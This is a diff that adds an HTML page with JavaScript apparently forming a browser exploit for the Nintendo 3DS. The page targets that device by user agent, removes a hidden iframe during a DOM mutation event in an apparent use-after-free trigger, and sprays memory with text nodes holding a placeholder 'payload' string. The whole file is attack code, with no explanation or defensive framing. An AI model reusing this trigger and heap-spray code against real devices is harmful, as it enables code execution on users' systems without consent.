@@ -1,0 +1,47 @@
+<html>
+<head>
+<style> body {color:blue;background:black;} iframe {display:none;} h1 {text-align:center;}
+       
+</style>
+<script>
+    if(parent==window) {
+        window.onload = function() {
+            document.body.innerHTML += "<iframe src='#' />";      
+ };
+    } else if(navigator.userAgent.indexOf('Nintendo 3DS') != -1) {
+        var nb = 0;
+        window.onload = function () {
+            f = window.frameElement;
+            p = f.parentNode;
+            var o = document.createElement("object");
+            o.addEventListener('beforeload', function () {
+                if (++nb == 1) {
+                    p.addEventListener('DOMSubtreeModified', parent.dsm, false);
+                } else if (nb == 2) {
+                    p.removeChild(f);
+                }
+            }, false);
+            document.body.appendChild(o);
+        };
+    }
+    function magicfun(mem, size, v) {
+        var a = new Array(size - 20);
+        nv = v + unescape("%ucccc");
+        for (var j = 0; j < a.length / (v.length / 4); j++) a[j] = nv;
+        var t = document.createTextNode(String.fromCharCode.apply(null, new Array(a)));
+ 
+        mem.push(t);
+    }
+ 
+    function dsm(e) {
+        var mem = [];
+        for (var j = 20; j < 430; j++)
+           magicfun(mem, j, unescape("payload"));
+           
+    }
+ 
+</script>
+</head>
+<body>
+</body>
+</html>
